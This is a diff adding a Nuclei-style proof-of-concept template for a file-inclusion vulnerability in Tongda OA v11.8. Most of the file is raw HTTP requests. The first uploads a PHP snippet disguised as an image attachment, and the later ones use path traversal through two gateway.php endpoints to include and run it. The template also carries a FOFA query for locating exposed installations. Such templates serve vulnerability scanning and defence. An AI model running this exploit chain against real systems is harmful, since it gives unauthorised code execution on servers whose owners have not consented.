@@ -1,0 +1,95 @@
+id: poc-local-oa-tongda-v11_8-gateway-php-file-include
+
+info:
+  name: 通达OA v11.8 getway.php 远程文件包含漏洞(可getshell)
+  author: capiton
+  severity: critical
+  description: 通达OA v11.8 getway.php 存在文件包含漏洞，攻击者通过发送恶意请求包含日志文件导致任意文件写入漏洞
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.8%20getway.php%20%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.html
+  metadata:
+    fofa-query: app="TDXK-通达OA"
+    Vulnerability-Impact: 通达OA v11.8
+  tags: tongda
+
+variables:
+  randInt: "{{rand_int(10000,99999)}}"
+  md5randInt: "{{randInt}}"
+
+requests:
+  - raw:
+      - |+
+        POST /ispirit/im/upload.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary={{randstr}}
+
+        --{{randstr}}
+        Content-Disposition: form-data; name="P"
+
+        123
+        --{{randstr}}
+        Content-Disposition: form-data; name="Filename"
+
+        php.jpg
+        --{{randstr}}
+        Content-Disposition: form-data; name="DEST_UID"
+
+        1
+        --{{randstr}}
+        Content-Disposition: form-data; name="UPLOAD_MODE"
+
+        2
+        --{{randstr}}
+        Content-Disposition: form-data; name="ATTACHMENT"; filename="{{randstr}}"
+
+        <?php echo md5({{randInt}});?>
+        --{{randstr}}--
+
+      - |+
+        POST /ispirit/interface/gateway.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+
+        json=%7B%22url%22%3A%22%2Fgeneral%2F..%2F..%2Fattach%2Fim%2F{{replace(replace(uploadpath,"|","."), "_", "\/")}}\%22%7D
+
+      - |+
+        POST /mac/gateway.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+
+        json=%7B%22url%22%3A%22%2Fgeneral%2F..%2F..%2Fattach%2Fim%2F{{replace(replace(uploadpath,"|","."), "_", "\/")}}\%22%7D
+
+
+
+    cookie-reuse: true
+    req-condition: true
+    redirects: false    
+
+    extractors:
+      - type: regex # type of the extractor
+        part: body  # part of the response (header,body,all)
+        group: 1        
+        name: uploadpath
+        internal: true
+        regex:
+          - '@(.*?)\|0\[\/vm\]' 
+
+    matchers-condition: and
+    matchers:
+      # - type: status
+      #   condition: and
+      #   status:
+      #     - 200
+
+      - type: word
+        part: body
+        condition: and   
+        words:  
+          - "+OK"
+          - "[/vm]"
+          - "{{md5randInt}}"
+
+          
